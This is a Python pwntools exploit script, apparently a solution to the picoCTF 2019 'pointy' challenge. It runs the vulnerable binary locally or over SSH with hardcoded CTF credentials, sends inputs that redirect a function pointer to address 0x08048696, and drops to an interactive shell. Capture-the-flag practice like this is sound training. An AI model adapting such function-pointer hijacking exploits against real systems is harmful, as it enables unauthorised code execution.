import binascii
from pwn import *
import sys


BINARY = './vuln'
context.terminal = ['tmux', 'splitw', '-h']


def attach_gdb(sh):
    gdb.attach(sh)


def P32(v):
    return struct.pack('I', v)


def P64(v):
    return struct.pack('Q', v)


def deHex(v):
    return binascii.unhexlify(v)[::-1]


def start():
    if args["REMOTE"]:
        s = ssh(host='2019shell1.picoctf.com',
                user='mikon', password="password")
        sh = s.process(
            'vuln', cwd='/problems/pointy_3_deeb3a1b1989d448ed67de5f3e45ca1f')
    else:
        sh = process(BINARY, stdout=process.PTY, stdin=process.PTY)

    if args["GDB"]:
        attach_gdb(sh)
    return sh


def main():
    sh = start()
    def send(x): return sh.sendlineafter('\n', x)
    send('student1')
    send('professor1')
    send('student1')
    send('professor1')
    send(str(0x08048696))

    sh.sendlineafter('student\n','student2')
    send('professor2')
    send('professor1')
    send('professor2')
    send('87')

    sh.interactive()


if __name__ == '__main__':
    main()
